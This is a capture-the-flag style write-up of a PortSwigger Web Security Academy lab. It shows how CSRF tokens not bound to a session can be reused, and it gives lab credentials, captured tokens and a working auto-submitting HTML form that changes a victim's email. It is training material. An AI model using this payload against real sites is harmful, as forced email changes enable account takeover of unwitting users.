# Lab: CSRF where token is not tied to user session
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system. 
* Goal:  To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
`wiener:peter`
`carlos:montoya`

## Background
CSRF token should tied to user session otherwise, it'll exploited by attacker.

## Recon
1. Username: `wiener`
![](https://i.imgur.com/tMOhBba.png)
Session: `l3IjqV4KRDAmncviJTvP80KK3RAHDJLG`
CSRF Token: `u4wMMtIhhUoTlc2LgadJFNRKOZ6bFAZr`

2. Username: `carlos`
![](https://i.imgur.com/I0eaArB.png)
Session: `Goc2H2lmU9Ki7Of4IcOWpE4XFNMWFslR`
CSRF Token: `UGabdiPPbGaTLsSa8vOV6MfBEvi2nGQ3`

3. What if we change session or csrf_token?
![](https://i.imgur.com/jHO6p00.png)
It seems work properly which means the user session didn't tie with unique `csrf_token`

## Exp
The csrf token should be altered to another token that was intercepted by Burp Suite which means this token haven't sent it. So, we can altered a package to forge another user to achieve CSRF.
Exploit Payload:
```javascript=
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5200320345733f806803640046007d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="danger&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="u4wMMtIhhUoTlc2LgadJFNRKOZ6bFAZr" />
    </form>
    <script>
          document.forms[0].submit();
    </script>
  </body>
</html>
```
:::spoiler Success Screenshot
![](https://i.imgur.com/zSm4Dyi.png)
:::

## Reference
[Lab: CSRF where token is not tied to user session - write up](https://www.cnblogs.com/Zeker62/p/15188614.html)